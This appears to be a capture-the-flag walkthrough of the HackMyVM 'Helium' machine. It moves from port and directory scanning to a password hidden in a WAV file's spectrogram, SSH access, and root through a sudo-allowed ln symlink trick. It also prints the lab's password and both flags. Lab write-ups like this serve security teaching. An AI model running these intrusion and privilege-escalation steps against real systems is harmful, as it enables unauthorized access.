# Helium

## Information

## Solution

### Enumeration
#### Nmap Discovery
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ nmap -sVC -p- -T4 10.11.5.27
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-25 11:33 +07
Nmap scan report for 10.11.5.27
Host is up (0.0067s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 12:f6:55:5f:c6:fa:fb:14:15:ae:4a:2b:38:d8:4a:30 (RSA)
|   256 b7:ac:87:6d:c4:f9:e3:9a:d4:6e:e0:4f:da:aa:22:20 (ECDSA)
|_  256 fe:e8:05:af:23:4d:3a:82:2a:64:9b:f7:35:e4:44:4a (ED25519)
80/tcp open  http    nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: RELAX
MAC Address: 08:00:27:6E:3B:7A (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 53.31 seconds
```
![web](/walkthroughs/hackmyvm/machines/beginner/Helium/web.png)

![source web](/walkthroughs/hackmyvm/machines/beginner/Helium/source-page.png)

HTML comment reveals a user named `paul` uploading `.wav` file.

```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ wget http://10.11.5.27/relax.wav
--2026-05-25 11:36:48--  http://10.11.5.27/relax.wav
Connecting to 10.11.5.27:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 250334 (244K) [application/octet-stream]
Saving to: ‘relax.wav’

relax.wav             100%[=======================>] 244.47K  --.-KB/s    in 0.004s  

2026-05-25 11:36:48 (66.9 MB/s) - ‘relax.wav’ saved [250334/250334]
```

#### Directory Enumeration
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ feroxbuster -u http://10.11.5.27/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt 
                                                                                      
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.11.5.27/
 🚩  In-Scope Url          │ 10.11.5.27
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        7l       12w      169c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET        1l        1w       23c http://10.11.5.27/bootstrap.min.css
200      GET       22l       46w      530c http://10.11.5.27/
301      GET        7l       12w      185c http://10.11.5.27/yay => http://10.11.5.27/yay/
[####################] - 8m    441091/441091  0s      found:3       errors:0      
[####################] - 7m    220545/220545  503/s   http://10.11.5.27/ 
[####################] - 7m    220545/220545  509/s   http://10.11.5.27/yay/                                                                               
```

#### Bootstrap.min.css analysis
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ curl -i "http://10.11.5.27/bootstrap.min.css"
HTTP/1.1 200 OK
Server: nginx/1.14.2
Date: Mon, 25 May 2026 05:23:54 GMT
Content-Type: text/css
Content-Length: 23
Last-Modified: Sun, 22 Nov 2020 19:22:47 GMT
Connection: keep-alive
ETag: "5fbaba87-17"
Accept-Ranges: bytes

/yay/mysecretsound.wav
```

### Initial Access
#### Audio Discovery
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ curl -i "http://10.11.5.27/yay/mysecretsound.wav"
HTTP/1.1 200 OK
Server: nginx/1.14.2
Date: Mon, 25 May 2026 05:26:52 GMT
Content-Type: application/octet-stream
Content-Length: 204814
Last-Modified: Sun, 22 Nov 2020 19:21:02 GMT
Connection: keep-alive
ETag: "5fbaba1e-3200e"
Accept-Ranges: bytes

Warning: Binary output can mess up your terminal. Use "--output -" to tell curl to 
Warning: output it to your terminal anyway, or consider "--output <FILE>" to save to 
Warning: a file.
```

```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ wget http://10.11.5.27/yay/mysecretsound.wav
--2026-05-25 12:28:02--  http://10.11.5.27/yay/mysecretsound.wav
Connecting to 10.11.5.27:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 204814 (200K) [application/octet-stream]
Saving to: ‘mysecretsound.wav’

mysecretsound.wav     100%[=======================>] 200.01K  --.-KB/s    in 0.02s   

2026-05-25 12:28:02 (11.1 MB/s) - ‘mysecretsound.wav’ saved [204814/204814]
```

#### Audio Steganography Ananlysis
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ audacity
                                                                                      
┌──(dungcngo㉿kali)-[/tmp]
└─$ audacity mysecretsound.wav 
```
![audio analysis](/walkthroughs/hackmyvm/machines/beginner/Helium/audio-analysis.png)

This is password of user `paul`: `dancingpassyo`.

#### SSH Access
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ ssh paul@10.11.5.27           
The authenticity of host '10.11.5.27 (10.11.5.27)' can't be established.
ED25519 key fingerprint is: SHA256:y4b6laUdkY6jY95p0UousHuja503C9EIqNNrMD5hoqA
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.11.5.27' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
paul@10.11.5.27's password: 
Linux helium 4.19.0-12-amd64 #1 SMP Debian 4.19.152-1 (2020-10-18) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Nov 22 14:31:51 2020 from 192.168.1.58
paul@helium:~$ id; hosname
uid=1000(paul) gid=1000(paul) groups=1000(paul),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
helium
```

#### Flags (user.txt)
```bash
paul@helium:~$ ls
user.txt
paul@helium:~$ cat user.txt 
ilovetoberelaxed
```

### Privilege Escalation
#### Sudo Enumeration 
```bash
paul@helium:~$ sudo -l
Matching Defaults entries for paul on helium:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User paul may run the following commands on helium:
    (ALL : ALL) NOPASSWD: /usr/bin/ln
paul@helium:~$ ls -la /usr/bin/ln
-rwxr-xr-x 1 root root 68552 Feb 28  2019 /usr/bin/ln
```
#### Abuse
![gtfo-bins](/walkthroughs/hackmyvm/machines/beginner/Helium/gtfo-bins.png)

```bash
paul@helium:~$ sudo -u root /usr/bin/ln -fs /bin/sh /bin/ln
# id
uid=0(root) gid=0(root) groups=0(root)
# hostname
helium
```

#### Flags (root.txt)
```bash
# cd /root
# ls
root.txt
# cat root.txt  
ilovetoberoot
```

***You are welcome!***
